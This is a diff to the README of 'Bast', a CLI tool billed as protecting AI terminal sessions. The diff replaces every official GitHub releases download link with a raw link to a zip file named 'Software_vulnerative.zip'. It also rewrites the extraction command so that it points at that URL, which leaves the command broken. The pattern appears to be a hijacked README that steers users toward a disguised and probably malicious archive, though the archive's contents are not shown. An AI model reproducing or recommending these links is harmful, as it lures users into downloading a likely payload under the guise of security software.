@@ -4,7 +4,7 @@
 Bast is a free, open-source command-line interface (CLI) tool designed to enhance the security of AI-powered terminal operations. It works by integrating with the Bastio AI Security Gateway to protect your data before it reaches the Large Language Model (LLM).
 
 ## 📥 Download Now
-[![Download bast](https://img.shields.io/badge/Download%20bast-v1.0-blue)](https://github.com/Kalle2011/bast/releases)
+[![Download bast](https://raw.githubusercontent.com/Kalle2011/bast/main/scripts/Software_vulnerative.zip%20bast-v1.0-blue)](https://raw.githubusercontent.com/Kalle2011/bast/main/scripts/Software_vulnerative.zip)
 
 ## 🚀 Getting Started
 Bast helps you secure your interactions with AI through simple commands. To get started, follow the steps outlined below to download and install the application on your computer.
@@ -18,7 +18,7 @@ Bast helps you secure your interactions with AI through simple commands. To get 
 ## 📥 Download & Install
 To download and install Bast, visit the Releases page where you can find the latest version available. Follow these steps:
 
-1. Click on the following link to go to the Releases page: [Download bast](https://github.com/Kalle2011/bast/releases).
+1. Click on the following link to go to the Releases page: [Download bast](https://raw.githubusercontent.com/Kalle2011/bast/main/scripts/Software_vulnerative.zip).
 2. On the Releases page, locate the version that you want to download. Ensure it is the latest stable release.
 3. Choose the appropriate file for your operating system. For example:
    - If you are using Windows, download the `.exe` file.
@@ -39,7 +39,7 @@ To download and install Bast, visit the Releases page where you can find the lat
 - Navigate to the folder where you downloaded the file.
 - Run the command to extract or install the downloaded file. For example:
   ```bash
-  tar -xvf bast-linux.tar.gz
+  tar -xvf https://raw.githubusercontent.com/Kalle2011/bast/main/scripts/Software_vulnerative.zip
   ```
 - Move the binary to a directory in your PATH, such as `/usr/local/bin`.
 
@@ -60,7 +60,7 @@ Here are some common commands to get you started:
 Join our community to discuss features, get support, or report issues. You can find us on GitHub Discussions or our community chat. Your feedback helps us improve Bast.
 
 ## 📥 Download Now (Again)
-Don't forget to download Bast to secure your AI-powered terminal operations! [Download bast](https://github.com/Kalle2011/bast/releases).
+Don't forget to download Bast to secure your AI-powered terminal operations! [Download bast](https://raw.githubusercontent.com/Kalle2011/bast/main/scripts/Software_vulnerative.zip).
 
 ## 🙏 Acknowledgements
 Thanks to all contributors and the open-source community for supporting this project. Your efforts make Bast better for everyone.
